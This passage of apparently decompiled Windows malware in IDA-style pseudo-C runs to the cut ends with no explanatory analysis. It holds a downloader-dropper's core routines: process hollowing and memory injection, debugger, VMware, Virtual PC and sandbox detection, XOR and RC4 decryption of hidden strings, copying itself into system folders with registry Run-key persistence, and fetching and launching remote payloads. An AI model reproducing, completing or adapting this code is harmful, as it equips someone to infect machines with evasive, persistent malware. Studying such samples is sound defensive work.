  v13 = GetProcAddress(dword_40613C, &byte_4050CC);
  v14 = GetProcAddress(dword_40613C, &byte_4050E0);
  v11 = GetProcAddress(dword_40613C, &byte_4050F4);
  v19 = GetProcAddress(dword_40613C, &byte_4050B4);
  CommandLineA = GetCommandLineA();
  if ( !((int (__stdcall *)(int, LPSTR, _DWORD, _DWORD, _DWORD, int, _DWORD, _DWORD, int *, HANDLE *))ProcAddress)(
          a2,
          CommandLineA,
          0,
          0,
          0,
          4,
          0,
          0,
          v5,
          &hProcess) )
    return 0;
  ((void (__stdcall *)(HANDLE, _DWORD))v15)(hProcess, *(_DWORD *)(v17 + 52));
  if ( !dword_406174(hProcess, *(_DWORD *)(v17 + 52), *(_DWORD *)(v17 + 80), 12288, 64) )
    return 0;
  v12 = 0;
  ((void (__stdcall *)(HANDLE, _DWORD, _WORD *, _DWORD, int *))v19)(
    hProcess,
    *(_DWORD *)(v17 + 52),
    a3,
    *(_DWORD *)(v17 + 84),
    &v12);
  if ( !v12 )
    return 0;
  for ( i = 0; i < *(unsigned __int16 *)(v17 + 6); ++i )
  {
    v16 = (_DWORD *)((char *)&a3[20 * i + 124] + *((_DWORD *)v10 + 15));
    ((void (__stdcall *)(HANDLE, int, char *, _DWORD, _DWORD))v19)(
      hProcess,
      v16[3] + *(_DWORD *)(v17 + 52),
      (char *)a3 + v16[5],
      v16[4],
      0);
  }
  ((void (__stdcall *)(int, int *))v13)(v8, v6);
  ((void (__stdcall *)(HANDLE, int, int, int, _DWORD))v19)(hProcess, v6[41] + 8, v17 + 52, 4, 0);
  v6[44] = *(_DWORD *)(v17 + 40) + *(_DWORD *)(v17 + 52);
  ((void (__stdcall *)(int, int *))v14)(v8, v6);
  ((void (__stdcall *)(int, _DWORD))v11)(v8, 0);
  sub_401DCE(hProcess);
  return 1;
}
// 406174: using guessed type int (__stdcall *dword_406174)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401DCE) --------------------------------------------------------
void __cdecl sub_401DCE(HANDLE hProcess)
{
  char v1[12]; // [esp+4h] [ebp-84h] BYREF
  LPCVOID lpBaseAddress; // [esp+10h] [ebp-78h]
  LPVOID v3; // [esp+2Ch] [ebp-5Ch]
  int v4; // [esp+30h] [ebp-58h]
  int v5; // [esp+34h] [ebp-54h]
  char v6[36]; // [esp+38h] [ebp-50h] BYREF
  int v7; // [esp+5Ch] [ebp-2Ch]
  LPVOID v8; // [esp+60h] [ebp-28h]
  LPCVOID Buffer; // [esp+80h] [ebp-8h] BYREF
  LPWSTR lpFilename; // [esp+84h] [ebp-4h]

  v5 = sub_4035F9((int)hProcess);
  if ( v5 )
  {
    Buffer = 0;
    v4 = 0;
    while ( ReadProcessMemory(hProcess, (LPCVOID)(v5 + 12), &Buffer, 4u, 0) )
    {
      if ( ReadProcessMemory(hProcess, Buffer, v1, 0x28u, 0) )
      {
        if ( ReadProcessMemory(hProcess, lpBaseAddress, v6, 0x48u, 0) )
        {
          lpFilename = (LPWSTR)sub_403875(0x208u);
          GetModuleFileNameW(0, lpFilename, 0x104u);
          LOWORD(v7) = 2 * lstrlenW(lpFilename);
          v3 = (LPVOID)dword_406174(hProcess, 0, (unsigned __int16)v7, 12288, 64);
          if ( v3 )
          {
            if ( WriteProcessMemory(hProcess, v3, lpFilename, (unsigned __int16)v7, 0) )
            {
              v8 = v3;
              WriteProcessMemory(hProcess, (LPVOID)lpBaseAddress, v6, 0x48u, 0);
            }
          }
        }
        return;
      }
      Sleep(5u);
      if ( v4 >= 600 )
        return;
      ++v4;
    }
  }
}
// 406174: using guessed type int (__stdcall *dword_406174)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 401DCE: using guessed type char var_84[12];

//----- (00401F27) --------------------------------------------------------
char *__usercall sub_401F27@<eax>(int a1@<ebx>, int a2, _DWORD *a3)
{
  int v4; // [esp+14h] [ebp-34h]
  int v5; // [esp+18h] [ebp-30h]
  int v6; // [esp+1Ch] [ebp-2Ch]
  int v7; // [esp+20h] [ebp-28h]
  int v8; // [esp+24h] [ebp-24h]
  int i; // [esp+28h] [ebp-20h]
  int j; // [esp+28h] [ebp-20h]
  int v11; // [esp+2Ch] [ebp-1Ch]
  FARPROC ProcAddress; // [esp+30h] [ebp-18h]
  FARPROC v13; // [esp+34h] [ebp-14h]
  char *v14; // [esp+38h] [ebp-10h]
  FARPROC v15; // [esp+3Ch] [ebp-Ch]
  FARPROC v16; // [esp+40h] [ebp-8h]
  _BYTE *v17; // [esp+44h] [ebp-4h]
  _BYTE *v18; // [esp+44h] [ebp-4h]

  ProcAddress = GetProcAddress(dword_406134, &byte_405130);
  v13 = GetProcAddress(dword_406134, &byte_405140);
  v15 = GetProcAddress(dword_406134, &byte_405150);
  v16 = GetProcAddress(dword_406134, &byte_405160);
  for ( i = 1; ; ++i )
  {
    v17 = sub_403875(0xAu);
    sub_402891(i, v17, 10);
    v8 = ((int (__stdcall *)(_DWORD, _BYTE *, int))ProcAddress)(0, v17, a2);
    if ( !v8 )
      break;
    *a3 += ((int (__stdcall *)(_DWORD, int))v13)(0, v8);
    sub_403762(v17);
  }
  if ( !*a3 )
    return 0;
  v14 = (char *)sub_403875(*a3 + 1);
  sub_40388E(a1, v14, 0, *a3 + 1);
  v11 = 0;
  for ( j = 1; ; ++j )
  {
    v18 = sub_403875(0xAu);
    sub_402891(j, v18, 10);
    v7 = ((int (__stdcall *)(_DWORD, _BYTE *, int))ProcAddress)(0, v18, a2);
    if ( !v7 )
      break;
    v6 = ((int (__stdcall *)(_DWORD, int))v13)(0, v7);
    v4 = ((int (__stdcall *)(_DWORD, int))v15)(0, v7);
    if ( !v4 )
      break;
    v5 = ((int (__stdcall *)(int))v16)(v4);
    if ( !v5 )
      break;
    sub_4038C1(&v14[v11], v5, v6);
    v11 += v6;
    sub_403762(v18);
  }
  return v14;
}

//----- (0040210B) --------------------------------------------------------
_BYTE *__cdecl sub_40210B(int a1)
{
  int v2; // [esp+4h] [ebp-Ch] BYREF
  int v3; // [esp+8h] [ebp-8h] BYREF
  LPVOID v4; // [esp+Ch] [ebp-4h]

  v2 = 0;
  v4 = sub_403875(0x438u);
  v3 = 1081;
  if ( a1 )
  {
    if ( !dword_40614C(-2147483646, &unk_405170, 0, 131097, &v2) )
    {
      if ( !dword_406150(v2, 0, 0, 0, v4, &v3) )
      {
        dword_406154(v2);
        return sub_403801((int)v4, byte_4054FC);
      }
      dword_406154(v2);
    }
    return 0;
  }
  else
  {
    if ( !dword_40614C(0x80000000, &unk_4052D0, 0, 983103, &v2) )
    {
      if ( !dword_406150(v2, 0, 0, 0, v4, &v3) )
      {
        dword_406154(v2);
        return sub_403801((int)v4, byte_405500);
      }
      dword_406154(v2);
    }
    return 0;
  }
}
// 4054FC: using guessed type _BYTE byte_4054FC[4];
// 405500: using guessed type _BYTE byte_405500[4];
// 40614C: using guessed type int (__stdcall *dword_40614C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406150: using guessed type int (__stdcall *dword_406150)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406154: using guessed type int (__stdcall *dword_406154)(_DWORD);

//----- (00402209) --------------------------------------------------------
const CHAR *sub_402209()
{
  const CHAR *result; // eax
  const CHAR *v1; // eax
  const CHAR *v2; // eax
  FARPROC ProcAddress; // [esp+10h] [ebp-20h]
  CHAR *v4; // [esp+14h] [ebp-1Ch]
  unsigned int v5; // [esp+18h] [ebp-18h]
  CHAR *v6; // [esp+1Ch] [ebp-14h]
  CHAR *lpString1; // [esp+20h] [ebp-10h]
  const CHAR *lpString2; // [esp+24h] [ebp-Ch]
  const CHAR *lpString2a; // [esp+24h] [ebp-Ch]
  unsigned int v10; // [esp+28h] [ebp-8h]
  CHAR *v11; // [esp+2Ch] [ebp-4h]

  ProcAddress = GetProcAddress(dword_406144, &byte_4052C4);
  result = sub_403801((int)byte_405736, byte_405504);
  lpString2 = result;
  if ( result )
  {
    lpString1 = (CHAR *)sub_403875(0xAu);
    v4 = (CHAR *)sub_403875(0xAu);
    v11 = (CHAR *)sub_403875(0x28u);
    v6 = (CHAR *)sub_403875(0xFFu);
    lstrcpyA(lpString1, lpString2);
    v1 = sub_403801(0, byte_405508);
    lstrcpyA(v4, v1);
    v2 = sub_403801(0, byte_40550C);
    lstrcpyA(v11, v2);
    lpString2a = sub_403801(0, byte_405510);
    lstrcpyA(v6, lpString2a);
    v5 = sub_4038E3(lpString1);
    v10 = sub_4038E3(v4);
    return (const CHAR *)((int (__stdcall *)(_DWORD, CHAR *, CHAR *, unsigned int))ProcAddress)(0, v6, v11, v10 + v5);
  }
  return result;
}
// 405504: using guessed type _BYTE byte_405504[4];
// 405508: using guessed type _BYTE byte_405508[4];
// 40550C: using guessed type _BYTE byte_40550C[4];
// 405510: using guessed type _BYTE byte_405510[4];

//----- (0040234B) --------------------------------------------------------
int sub_40234B()
{
  int v0; // eax
  int result; // eax
  int v2; // eax
  int v3; // [esp+4h] [ebp-Ch] BYREF
  int v4; // [esp+8h] [ebp-8h] BYREF
  LPSTR lpString1; // [esp+Ch] [ebp-4h]

  if ( sub_4037C7(byte_405599, byte_405514) )
  {
    v4 = 0;
    lpString1 = (LPSTR)sub_403875(0x105u);
    lstrcpyA(lpString1, &byte_405318);
    sub_40377C(lpString1, byte_405599);
    if ( !dword_406130 || dword_405460 )
      dword_406158(-2147483647, lpString1, &v4);
    else
      dword_406158(-2147483646, lpString1, &v4);
    v0 = sub_4038F4((int)dword_406120);
    dword_40615C(v4, &unk_4051B4, 0, 1, dword_406120, v0);
    return dword_406154(v4);
  }
  else
  {
    result = sub_4037C7(String1, byte_405518);
    if ( result )
    {
      if ( !dword_406130 || dword_405460 )
        dword_406158(-2147483647, &unk_4052E8, &v3);
      else
        dword_406158(-2147483646, &unk_4052E8, &v3);
      v2 = sub_4038F4((int)dword_406120);
      dword_40615C(v3, String1, 0, 1, dword_406120, v2);
      return dword_406154(v3);
    }
  }
  return result;
}
// 405460: using guessed type int dword_405460;
// 405514: using guessed type _BYTE byte_405514[4];
// 405518: using guessed type _BYTE byte_405518[4];
// 406130: using guessed type int dword_406130;
// 406154: using guessed type int (__stdcall *dword_406154)(_DWORD);
// 406158: using guessed type int (__stdcall *dword_406158)(_DWORD, _DWORD, _DWORD);
// 40615C: using guessed type int (__stdcall *dword_40615C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004024A5) --------------------------------------------------------
LPSTR __cdecl sub_4024A5(char *a1)
{
  CHAR *v2; // eax
  CHAR *v3; // eax
  CHAR *v4; // eax
  CHAR *v5; // eax
  FARPROC v6; // [esp+0h] [ebp-Ch]
  FARPROC v7; // [esp+4h] [ebp-8h]
  FARPROC ProcAddress; // [esp+8h] [ebp-4h]

  ProcAddress = GetProcAddress(dword_406134, &byte_40539C);
  v6 = GetProcAddress(dword_406134, &byte_4053A8);
  v7 = GetProcAddress(dword_406134, &byte_4053B4);
  if ( sub_4037C7(byte_4055E9, byte_40551C) && sub_4037C7(byte_4055E9, byte_405520) )
  {
    dword_40612C = 0;
    return a1;
  }
  else
  {
    if ( !dword_406130 || dword_405460 )
    {
      v5 = sub_40379E(a7hz4s);
      lstrcpyA(dword_406120, v5);
    }
    else if ( sub_4037C7(byte_4055EB, asc_405350) )
    {
      if ( sub_4037C7(byte_4055EB, asc_405354) )
      {
        if ( sub_4037C7(byte_4055EB, a2Hz) )
          v4 = sub_40379E(a7hz4s);
        else
          v4 = sub_40379E(&byte_40537C);
        lstrcpyA(dword_406120, v4);
      }
      else
      {
        v3 = sub_40379E(&byte_405364);
        lstrcpyA(dword_406120, v3);
        sub_40377C(dword_406120, byte_405370);
      }
    }
    else
    {
      v2 = sub_40379E(&byte_405364);
      lstrcpyA(dword_406120, v2);
    }
    sub_40377C(dword_406120, "\\");
    sub_40377C(dword_406120, byte_4055C0);
    if ( sub_4037C7(a1, dword_406120) )
    {
      if ( sub_4037C7(byte_4055E9, byte_405528) )
        ((void (__stdcall *)(char *, LPSTR, _DWORD))v6)(a1, dword_406120, 0);
      else
        ((void (__stdcall *)(char *, LPSTR, int))ProcAddress)(a1, dword_406120, 3);
      if ( !sub_4037C7(byte_4055EF, byte_40552C) )
        ((void (__stdcall *)(LPSTR, int))v7)(dword_406120, 2);
      if ( sub_4037C7(byte_405736, byte_405530) )
        sub_402209();
      sub_40234B();
      dword_40612C = 1;
      return dword_406120;
    }
    else
    {
      dword_40612C = 0;
      return a1;
    }
  }
}
// 405460: using guessed type int dword_405460;
// 40551C: using guessed type _BYTE byte_40551C[4];
// 405520: using guessed type _BYTE byte_405520[4];
// 405528: using guessed type _BYTE byte_405528[4];
// 40552C: using guessed type _BYTE byte_40552C[4];
// 405530: using guessed type _BYTE byte_405530[4];
// 40612C: using guessed type int dword_40612C;
// 406130: using guessed type int dword_406130;

//----- (00402704) --------------------------------------------------------
int sub_402704()
{
  FARPROC v1; // [esp+0h] [ebp-1Ch]
  FARPROC ProcAddress; // [esp+4h] [ebp-18h]
  int v3; // [esp+8h] [ebp-14h] BYREF
  int v4; // [esp+Ch] [ebp-10h] BYREF
  char v5[8]; // [esp+10h] [ebp-Ch] BYREF
  FARPROC v6; // [esp+18h] [ebp-4h]

  ProcAddress = GetProcAddress(hModule, &byte_405424);
  if ( !ProcAddress )
    return 1;
  v6 = GetProcAddress(hModule, &byte_405440);
  if ( !v6 )
    return 1;
  v1 = GetProcAddress(hModule, &byte_405458);
  if ( !v1 )
    return 1;
  v5[0] = 0;
  v5[1] = 0;
  v5[2] = 0;
  v5[3] = 0;
  v5[4] = 0;
  v5[5] = 5;
  if ( !((int (__stdcall *)(char *, int, int, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int *))ProcAddress)(
          v5,
          2,
          32,
          544,
          0,
          0,
          0,
          0,
          0,
          0,
          &v3) )
    return 0;
  v4 = 0;
  if ( !((int (__stdcall *)(_DWORD, int, int *))v6)(0, v3, &v4) )
    v4 = 0;
  ((void (__stdcall *)(int))v1)(v3);
  return v4;
}

//----- (004027F7) --------------------------------------------------------
BOOL sub_4027F7()
{
  int v1; // [esp+4h] [ebp-10h] BYREF
  int v2; // [esp+8h] [ebp-Ch] BYREF
  int v3; // [esp+Ch] [ebp-8h] BYREF
  int v4; // [esp+10h] [ebp-4h]

  v1 = 0;
  v2 = 4;
  v4 = dword_40614C(-2147483646, &unk_4053DC, 0, 1, &v1);
  if ( v4 )
    return v4 == 5;
  if ( dword_406150(v1, &unk_405418, 0, 0, &v3, &v2) )
  {
    dword_406154(v1);
    return 0;
  }
  else
  {
    dword_406154(v1);
    return v3 != 0;
  }
}
// 40614C: using guessed type int (__stdcall *dword_40614C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406150: using guessed type int (__stdcall *dword_406150)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406154: using guessed type int (__stdcall *dword_406154)(_DWORD);

//----- (00402891) --------------------------------------------------------
_BYTE *__cdecl sub_402891(int a1, _BYTE *a2, int a3)
{
  int v4; // [esp+0h] [ebp-14h]
  char *v5; // [esp+4h] [ebp-10h]
  char v6; // [esp+8h] [ebp-Ch]
  int v7; // [esp+Ch] [ebp-8h]
  _BYTE *v8; // [esp+10h] [ebp-4h]
  char *i; // [esp+10h] [ebp-4h]

  if ( a3 >= 2 && a3 <= 16 )
  {
    v8 = a2;
    v7 = a1;
    do
    {
      v4 = v7 % a3;
      if ( v7 % a3 < 0 )
        v4 = -v4;
      *v8++ = byte_405534[v4];
      v7 /= a3;
    }
    while ( v7 );
    if ( a1 < 0 && a3 == 10 )
      *v8++ = 45;
    *v8 = 0;
    v5 = a2;
    for ( i = v8 - 1; v5 < i; --i )
    {
      v6 = *v5;
      *v5 = *i;
      *i = v6;
      ++v5;
    }
    return a2;
  }
  else
  {
    *a2 = 0;
    return a2;
  }
}

//----- (00402969) --------------------------------------------------------
int sub_402969()
{
  __asm { vpcext  7, 0Bh }
  return 1;
}

//----- (004029E1) --------------------------------------------------------
BOOL sub_4029E1()
{
  return GetModuleHandleA(ModuleName)
      || GetModuleHandleA(&byte_4051CC)
      || GetModuleHandleA(a2Q)
      || GetModuleHandleA(a7)
      || GetModuleHandleA(aL5);
}

//----- (00402A3A) --------------------------------------------------------
int sub_402A3A()
{
  __indword(0x5658u);
  return 0;
}
// 402AB7: conditional instruction was optimized away because %var_20.4==8685D465

//----- (00402AD3) --------------------------------------------------------
BOOL __thiscall sub_402AD3(void *this)
{
  HANDLE CurrentProcess; // eax
  void *v3; // [esp+0h] [ebp-4h] BYREF

  v3 = this;
  if ( IsDebuggerPresent() )
    return 1;
  v3 = 0;
  CurrentProcess = GetCurrentProcess();
  dword_406170(CurrentProcess, 7, &v3, 4, 0);
  return v3 != 0;
}
// 406170: using guessed type int (__stdcall *dword_406170)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00402B19) --------------------------------------------------------
int sub_402B19()
{
  int v1; // [esp+4h] [ebp-8h] BYREF
  int i; // [esp+8h] [ebp-4h]

  for ( i = 0; i < 5000000; ++i )
  {
    v1 = 684;
    sub_403762(&v1);
  }
  return 0;
}

//----- (00402B5B) --------------------------------------------------------
int __cdecl sub_402B5B(int a1, int a2, unsigned int a3, unsigned int a4)
{
  int i; // [esp+4h] [ebp-410h]
  int j; // [esp+4h] [ebp-410h]
  int v7[256]; // [esp+8h] [ebp-40Ch]
  unsigned int k; // [esp+408h] [ebp-Ch]
  int v9; // [esp+40Ch] [ebp-8h]
  int v10; // [esp+410h] [ebp-4h]

  v10 = 0;
  for ( i = 0; i < 256; ++i )
    v7[i] = i;
  for ( j = 0; j < 256; ++j )
  {
    v10 = (*(unsigned __int8 *)(a2 + j % a4) + v7[j] + v10) % 256;
    LOBYTE(v9) = v7[j];
    v7[j] = v7[v10];
    v7[v10] = (unsigned __int8)v9;
  }
  for ( k = 0; k < a3; ++k )
  {
    j = (j + 1) % 256;
    v10 = (v7[j] + v10) % 256;
    LOBYTE(v9) = v7[j];
    v7[j] = v7[v10];
    v7[v10] = (unsigned __int8)v9;
    *(_BYTE *)(k + a1) ^= LOBYTE(v7[(v7[v10] + v7[j]) % 256]);
  }
  return a1;
}
// 402B5B: using guessed type int var_40C[256];

//----- (00402D2B) --------------------------------------------------------
int sub_402D2B()
{
  sub_4030D2((int)&byte_405068, 14);
  sub_4030D2((int)&byte_40509C, 20);
  sub_4030D2((int)&byte_4050B4, 20);
  sub_4030D2((int)&byte_4050CC, 18);
  sub_4030D2((int)&byte_4050E0, 18);
  sub_4030D2((int)&byte_4050F4, 14);
  sub_4030D2((int)&byte_405120, 14);
  sub_4030D2((int)&byte_405130, 13);
  sub_4030D2((int)&byte_405140, 14);
  sub_4030D2((int)&byte_405150, 12);
  sub_4030D2((int)&byte_405160, 12);
  sub_4030D2((int)&ProcName, 13);
  sub_4030D2((int)&byte_405274, 16);
  sub_4030D2((int)&unk_4052D0, 23);
  sub_4030D2((int)&byte_405288, 13);
  sub_4030D2((int)&byte_405298, 14);
  sub_4030D2((int)&byte_4052A8, 11);
  sub_4030D2((int)&unk_4052E8, 45);
  sub_4030D2((int)&byte_405318, 53);
  sub_4030D2((int)&byte_405364, 10);
  sub_4030D2((int)byte_405370, 9);
  sub_4030D2((int)&byte_40539C, 11);
  sub_4030D2((int)&byte_4053A8, 9);
  sub_4030D2((int)&byte_4053B4, 18);
  sub_4030D2((int)&byte_405104, 25);
  sub_4030D2((int)&byte_405200, 13);
  sub_4030D2((int)&byte_405210, 16);
  sub_4030D2((int)&byte_405224, 16);
  sub_4030D2((int)&byte_405238, 19);
  sub_4030D2((int)LibFileName, 12);
  sub_4030D2((int)a2, 12);
  sub_4030D2((int)asc_405030, 9);
  sub_4030D2((int)asc_40505C, 11);
  sub_4030D2((int)aAg, 10);
  sub_4030D2((int)&unk_4053C8, 16);
  sub_4030D2((int)&byte_4052C4, 11);
  sub_4030D2((int)&unk_405390, 8);
  sub_4030D2((int)asc_405258, 11);
  sub_4030D2((int)&byte_4052B4, 13);
  sub_4030D2((int)asc_405350, 3);
  sub_4030D2((int)asc_405354, 3);
  sub_4030D2((int)a2Hz, 3);
  sub_4030D2((int)&a2Hz[4], 2);
  sub_4030D2((int)byte_405360, 2);
  sub_4030D2((int)a7hz4s, 3);
  sub_4030D2((int)&byte_40537C, 7);
  sub_4030D2(4215688, 4);
  sub_4030D2((int)&unk_4053DC, 57);
  sub_4030D2((int)&unk_405418, 9);
  sub_4030D2((int)ModuleName, 11);
  sub_4030D2((int)&byte_4051CC, 11);
  sub_4030D2((int)a2Q, 11);
  sub_4030D2((int)a7, 13);
  sub_4030D2((int)aL5, 11);
  sub_4030D2((int)&unk_405170, 64);
  sub_4030D2((int)&unk_4051B4, 8);
  sub_4030D2((int)&byte_405424, 24);
  sub_4030D2((int)&byte_405440, 20);
  sub_4030D2((int)&byte_405458, 7);
  sub_4030D2((int)&byte_405084, 11);
  sub_4030D2((int)&byte_405090, 9);
  return sub_4030D2((int)&byte_405078, 11);
}
// 405360: using guessed type _BYTE byte_405360[4];

//----- (004030D2) --------------------------------------------------------
int __cdecl sub_4030D2(int a1, int a2)
{
  int result; // eax
  int i; // [esp+0h] [ebp-4h]

  for ( i = 0; i <= a2; ++i )
  {
    *(_BYTE *)(i + a1) ^= String[i % dword_406128];
    result = i + 1;
  }
  return result;
}
// 406128: using guessed type int dword_406128;

//----- (00403116) --------------------------------------------------------
int __usercall StartAddress@<eax>(int a1@<ebx>)
{
  int result; // eax
  CHAR *v2; // eax
  CHAR *v3; // eax
  CHAR *v4; // eax
  CHAR *v5; // eax
  int v6; // [esp+8h] [ebp-34h]
  CHAR *lpString1; // [esp+Ch] [ebp-30h]
  SIZE_T dwBytes; // [esp+10h] [ebp-2Ch] BYREF
  int v9; // [esp+14h] [ebp-28h]
  int j; // [esp+18h] [ebp-24h] BYREF
  LPVOID v11; // [esp+1Ch] [ebp-20h]
  int v12; // [esp+20h] [ebp-1Ch]
  FARPROC ProcAddress; // [esp+24h] [ebp-18h]
  FARPROC v14; // [esp+28h] [ebp-14h]
  int i; // [esp+2Ch] [ebp-10h]
  FARPROC v16; // [esp+30h] [ebp-Ch]
  int v17; // [esp+34h] [ebp-8h]
  FARPROC v18; // [esp+38h] [ebp-4h]

  ProcAddress = GetProcAddress(dword_406140, &byte_405200);
  v18 = GetProcAddress(dword_406140, &byte_405210);
  v14 = GetProcAddress(dword_406140, &byte_405224);
  v16 = GetProcAddress(dword_406140, &byte_405238);
  result = ((int (__stdcall *)(_DWORD, int, _DWORD, _DWORD, _DWORD))ProcAddress)(0, 1, 0, 0, 0);
  v17 = result;
  if ( result )
  {
    for ( i = 0; i < 5; ++i )
    {
      result = sub_4037C7((char *)&unk_4058D4 + 424 * i, a0);
      if ( !result )
        return result;
      if ( dword_40612C || sub_4037C7(&byte_405A7A[424 * i], a0_0) && sub_4037C7(&byte_405A7A[424 * i], ::a1) )
      {
        v12 = ((int (__stdcall *)(int, char *, _DWORD, _DWORD, _DWORD, _DWORD))v18)(
                v17,
                (char *)&unk_4058D4 + 424 * i,
                0,
                0,
                0,
                0);
        if ( !v12 )
          return ((int (__stdcall *)(int))v16)(v17);
        v11 = sub_403875(0x400u);
        v9 = 0;
        dwBytes = 0;
        for ( j = 0; ; sub_4038C1((_BYTE *)(dwBytes - j + v9), (int)v11, j) )
        {
          ((void (__stdcall *)(int, LPVOID, int, int *))v14)(v12, v11, 1023, &j);
          if ( !j )
            break;
          dwBytes += j;
          v9 = (int)sub_4036B0(a1, v9, dwBytes, dwBytes - j);
        }
        if ( sub_4037C7((char *)&unk_40594C + 424 * i, &a2Hz[4]) )
        {
          if ( sub_4037C7((char *)&unk_40594C + 424 * i, byte_405360) )
          {
            if ( lstrcmpiA((LPCSTR)&unk_40594C + 424 * i, asc_405354)
              && lstrcmpiA((LPCSTR)&unk_40594C + 424 * i, asc_405350)
              && lstrcmpiA((LPCSTR)&unk_40594C + 424 * i, a7hz4s)
              && lstrcmpiA((LPCSTR)&unk_40594C + 424 * i, a2Hz) )
            {
              sub_401B85(a1, (int)&unk_40594C + 424 * i, (_WORD *)v9);
            }
            else
            {
              lpString1 = (CHAR *)sub_403875(0x105u);
              if ( lstrcmpiA((LPCSTR)&unk_40594C + 424 * i, asc_405354) )
              {
                if ( lstrcmpiA((LPCSTR)&unk_40594C + 424 * i, asc_405350) )
                {
                  if ( lstrcmpiA((LPCSTR)&unk_40594C + 424 * i, a7hz4s) )
                  {
                    if ( !lstrcmpiA((LPCSTR)&unk_40594C + 424 * i, a2Hz) )
                    {
                      v5 = sub_40379E(a2Hz);
                      lstrcpyA(lpString1, v5);
                    }
                  }
                  else
                  {
                    v4 = sub_40379E(a7hz4s);
                    lstrcpyA(lpString1, v4);
                  }
                }
                else
                {
                  v3 = sub_40379E(&byte_405364);
                  lstrcpyA(lpString1, v3);
                }
              }
              else
              {
                v2 = sub_40379E(&byte_405364);
                lstrcpyA(lpString1, v2);
                sub_40377C(lpString1, asc_405554);
                sub_40377C(lpString1, byte_405370);
              }
              sub_40377C(lpString1, asc_405558);
              sub_40377C(lpString1, (const char *)&unk_405975 + 424 * i);
              result = dword_406164(lpString1, 0x40000000, 0, 0, 2, 0, 0);
              v6 = result;
              if ( result == -1 )
                return result;
              dword_406168(result, v9, dwBytes, &dwBytes, 0);
              dword_40616C(v6);
              if ( sub_4037C7(&byte_405A7A[424 * i], a1_0) && sub_4037C7(&byte_405A7A[424 * i], a3) )
                dword_406160(0, 4215688, lpString1, 0, 0, 0);
              else
                dword_406160(0, 4215688, lpString1, 0, 0, 1);
            }
          }
          else
          {
            sub_401B85(a1, (int)::lpString1, (_WORD *)v9);
          }
        }
        else
        {
          sub_401B85(a1, (int)lpString2, (_WORD *)v9);
        }
      }
    }
    return ((int (__stdcall *)(int))v16)(v17);
  }
  return result;
}
// 405360: using guessed type _BYTE byte_405360[4];
// 40612C: using guessed type int dword_40612C;
// 406160: using guessed type int (__stdcall *dword_406160)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406164: using guessed type int (__stdcall *dword_406164)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406168: using guessed type int (__stdcall *dword_406168)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40616C: using guessed type int (__stdcall *dword_40616C)(_DWORD);

//----- (004035F9) --------------------------------------------------------
int __cdecl sub_4035F9(int a1)
{
  char v2[4]; // [esp+0h] [ebp-18h] BYREF
  int v3; // [esp+4h] [ebp-14h]

  dword_406170(a1, 0, v2, 24, 0);
  return v3;
}
// 406170: using guessed type int (__stdcall *dword_406170)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4035F9: using guessed type char var_18[4];

//----- (004036B0) --------------------------------------------------------
_BYTE *__usercall sub_4036B0@<eax>(int a1@<ebx>, int a2, SIZE_T dwBytes, int a4)
{
  _BYTE *v5; // [esp+Ch] [ebp-4h]

  if ( !a2 )
    return sub_403875(dwBytes);
  if ( a4 == dwBytes )
    return (_BYTE *)a2;
  v5 = sub_403875(dwBytes);
  if ( !v5 )
    return 0;
  if ( dwBytes <= a4 )
  {
    sub_4038C1(v5, a2, dwBytes);
  }
  else
  {
    sub_4038C1(v5, a2, a4);
    sub_40388E(a1, &v5[a4], 0, dwBytes - a4);
  }
  sub_403762((LPVOID)a2);
  return v5;
}

//----- (00403762) --------------------------------------------------------
BOOL __cdecl sub_403762(LPVOID lpMem)
{
  BOOL result; // eax

  if ( lpMem )
    return HeapFree(hHeap, 0, lpMem);
  return result;
}

//----- (0040377C) --------------------------------------------------------
char *__cdecl sub_40377C(char *a1, const char *a2)
{
  char *i; // eax

  for ( i = a1; *i; ++i )
    ;
  sub_4037EC(i, a2);
  return a1;
}

//----- (0040379E) --------------------------------------------------------
CHAR *__cdecl sub_40379E(LPCSTR lpName)
{
  DWORD EnvironmentVariableA; // eax

  EnvironmentVariableA = GetEnvironmentVariableA(lpName, Buffer, 0x400u);
  if ( EnvironmentVariableA && EnvironmentVariableA <= 0x400 )
    return Buffer;
  else
    return 0;
}

//----- (004037C7) --------------------------------------------------------
int __cdecl sub_4037C7(char *a1, _BYTE *a2)
{
  char v4; // al

  while ( 1 )
  {
    v4 = *a1;
    if ( *a1 != *a2 )
      return v4 - (char)*a2;
    if ( !v4 )
      break;
    ++a1;
    ++a2;
  }
  return 0;
}

//----- (004037EC) --------------------------------------------------------
char *__cdecl sub_4037EC(char *a1, const char *a2)
{
  strcpy(a1, a2);
  return a1;
}

//----- (00403801) --------------------------------------------------------
_BYTE *__cdecl sub_403801(int a1, _BYTE *a2)
{
  int v2; // eax
  _BYTE *i; // edx
  _BYTE *v4; // esi
  char v5; // al
  _BYTE *v6; // ecx
  _BYTE *v7; // esi

  v2 = a1;
  if ( !a1 )
    v2 = dword_406578;
  for ( i = (_BYTE *)v2; *i; ++i )
  {
    v4 = a2;
    if ( *a2 )
    {
      v5 = *a2;
      do
      {
        if ( v5 == *i )
          break;
        v5 = *++v4;
      }
      while ( *v4 );
    }
    if ( !*v4 )
      break;
  }
  v6 = i;
  v7 = a2;
  if ( *i )
  {
    while ( *v6 != *v7 )
    {
      if ( !*++v7 )
      {
        v7 = a2;
        ++v6;
      }
      if ( !*v6 )
        goto LABEL_17;
    }
    *v6++ = 0;
  }
LABEL_17:
  dword_406578 = (int)v6;
  return v6 != i ? i : 0;
}
// 406578: using guessed type int dword_406578;

//----- (00403875) --------------------------------------------------------
LPVOID __cdecl sub_403875(SIZE_T dwBytes)
{
  SIZE_T v1; // eax

  v1 = dwBytes;
  if ( !dwBytes )
    v1 = 1;
